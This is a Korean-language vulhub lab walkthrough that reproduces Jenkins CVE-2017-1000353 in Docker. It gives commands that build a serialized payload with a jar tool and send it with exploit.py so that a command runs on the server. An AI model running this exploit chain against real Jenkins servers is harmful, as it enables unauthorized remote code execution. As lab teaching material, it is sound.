# Whitehat School `vulhub` 한글판
# Jenkins-CI 원격 코드 실행 취약점（CVE-2017-1000353）

## 원리

참고 :  https://blogs.securiteam.com/index.php/archives/3171

## 환경 구축

다음 명령을 실행해 jenkins 2.46.1 시작:

```
docker compose up -d
```

부팅이 완료되면 `http://your-ip:8080` 를 방문해 jenkins가 설치되어 있는것을 확인할 수 있다.

## 테스트 과정

### 1. Serialize 문자열 생성
참고 <https://github.com/vulhub/CVE-2017-1000353>

먼저 CVE-2017-1000353-1.1-SNAPSHOT-all.jar 다운받습니다. 이것은 POC를 생성하는 도구입니다.

다음 명령을 실행하여 바이트 코드 파일 생성 :

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser 생성된 바이트 코드 파일 이름
# "touch ..." 실행할 명령
```

코드를 실행하면 jenkins_poc.ser 파일이 생성된다. 이것은 직렬화된(Serialize) 문자열이다.

### 2. 패킷 전송, 명령 실행

[exploit.py]다운로드 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py,

python3 실행 `python exploit.py http://your-ip:8080 jenkins_poc.ser`

방금 생성한 바이트 코드 파일을 대상에게 보냅니다:

![](1.png)

docker에 들어가면 /tmp/success가 성공적으로 생성되어 취약점을 이용한 공격이 성공했음을 확인할 수 있다.